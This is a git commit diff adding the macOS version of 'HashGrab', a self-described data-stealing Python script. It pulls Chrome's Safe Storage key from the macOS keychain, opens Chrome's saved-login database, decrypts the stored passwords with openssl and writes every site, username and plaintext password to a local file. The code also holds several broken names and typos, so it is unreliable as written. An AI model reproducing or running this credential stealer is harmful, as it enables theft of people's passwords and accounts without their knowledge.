8350d9afcaf45691884989430c2ca20c586d0b62
TheStandardPancake <40510902+TheStandardPancake@users.noreply.github.com>
2019-04-16 13:28:18 +1000

    pretty much done the mac varient

--- HashGrab/HashGrabM.py
+++ HashGrab/HashGrabM.py
@@ -5,6 +5,7 @@ import sqlite3
 import binascii
 import subprocess
 import hashlib
+import base64
 
 print("""
 Stealing Ya' Data since 2019
@@ -39,6 +40,7 @@ made by TheStandardPancake, The Mac Edition!
 
 """)
 #this version for mac was made pretty much entirely by me this time, though still I give some credit to bluedangerforyou for inspiration
+#Also credit to thanatoskira for the process of decrypting mac key style encryptions
 
 #setting up the file to dump info
 usb = os.path.abspath(__file__)
@@ -51,6 +53,8 @@ siteId = "Site ID: "
 password_field = "Password: "
 
 #The magic happens
+safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")
+
 f = open(os.path.join(path,"passwordsusers.txt"), "w")
 conn = sqlite3.connect(expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"))
 cursor = conn.cursor()
@@ -58,9 +62,11 @@ cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
 def decryting(encrypted, iv):
     hexKey = binascii.hexlify(hashlib.pkdf2_hmac('sha1',safeStorageKey, b"saltysalt", 1003)[:16])
-
+    hecEncPassword = base64.b64encode(encypted_value[3:])
+    decrpyted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
+    return decrypted
 
 for result in cursor.fetchall():
-	password =
-	   f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
+	password = decrypting(result[2], iv = ''.join(('20',) * 16))
+	f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
 f.close()
